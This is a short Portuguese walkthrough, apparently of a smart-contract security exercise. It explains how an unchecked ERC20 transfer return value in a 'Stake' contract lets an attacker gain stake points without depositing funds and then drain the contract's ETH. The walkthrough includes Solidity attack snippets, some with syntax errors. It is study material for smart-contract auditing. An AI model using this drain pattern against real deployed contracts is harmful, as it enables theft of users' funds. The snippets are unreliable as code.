Embora este exemplo sejá bem simples, podemos esquecer de checar o retorno `success bool` quando realizamos chamadas externas, neste caso de `transfer` para saber se a mesma ocorreu da forma que deveria, como [este](https://github.com/crytic/slither/wiki/Detector-Documentation#unchecked-transfer)

Um exemplo de um possível ataque é descrito abaixo.

1) Use `ERC(Stake.WETH()).approve(address(Stake), 1 ether)` para determinar de o contrato pode transferir os tokens que você "possui"

2) Agora use a função `Stake.StakeWETH(uint256 amount)` com qualquer valor para amount que seja maior que o `Stake.balance` e veja seus `UserStake` points subirem sem haver transferido quaiquer fundos e extraia através de `Unstake(uint256 amount)` com amount igual a `Stake.balance` e veja o ETH indo para sua carteira, por exemplo:

```
function () payable {
  ERC20(Stake.WETH).approve(stakeAddress, 1000000000000000000);
  Stake.StakeWETH(1000000000000000000);
  Stake.Unstake(Stake.balance);
}
```

3) Nesse cenário, `UserStake[attackerContractAddress]` será maior que o valor transferido ao contrato, permitindo que a função `Unstake(uint256 amount)` seja chamada, adicione também uma transferência dos fundos para a sua wallet, assim os fundos irão para a sua wallet e o contrato será drenado, por exemplo:

```
function () payable {
  ERC20(Stake.WETH).approve(stakeAddress, 1000000000000000000);
  Stake.StakeWETH(1000000000000000000);
  Stake.Unstake(Stake.balance);
  (bool success, bytes memory return) = payable(msg.sender).call{value: address(this).balance}("")
  require (success)
}
```